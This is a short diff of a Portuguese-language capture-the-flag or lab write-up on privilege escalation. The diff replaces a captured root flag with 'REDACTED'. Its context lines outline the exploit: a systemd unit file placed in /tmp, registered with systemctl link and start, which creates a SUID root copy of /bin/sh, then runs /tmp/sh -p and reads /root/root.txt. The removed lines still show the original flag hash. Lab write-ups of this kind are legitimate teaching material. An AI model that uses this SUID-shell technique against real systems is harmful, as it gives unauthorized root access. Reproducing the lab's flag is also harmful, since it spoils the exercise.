@@ -59,7 +59,7 @@ Resumo das fases aplicadas:
     
 - **Prova curta (PoC):** criação de unit file em `/tmp`, `systemctl link` + `systemctl start` → criação de `/tmp/sh` com bit SUID e execução como root.
     
-- **Flag / Artefato:** `a58ff8579f0a9270368d33a9966c7fd5` (conteúdo de `/root/root.txt`).
+- **Flag / Artefato:** `REDACTED` (conteúdo de `/root/root.txt`).
 
 ---
 
@@ -89,8 +89,7 @@ ls -l /tmp/sh # -rwsr-xr-x 1 root root 129816 Oct 17 18:26 /tmp/sh
 /tmp/sh -p 
 whoami # root  
 id # uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data) 
-cat /root/root.txt 
-# a58ff8579f0a9270368d33a9966c7fd5
+cat /root/root.txt
 ```
 
 > Evidências adicionais (screenshots / logs / Burp export) anexadas na pasta `evidence/` (veja Apêndice).
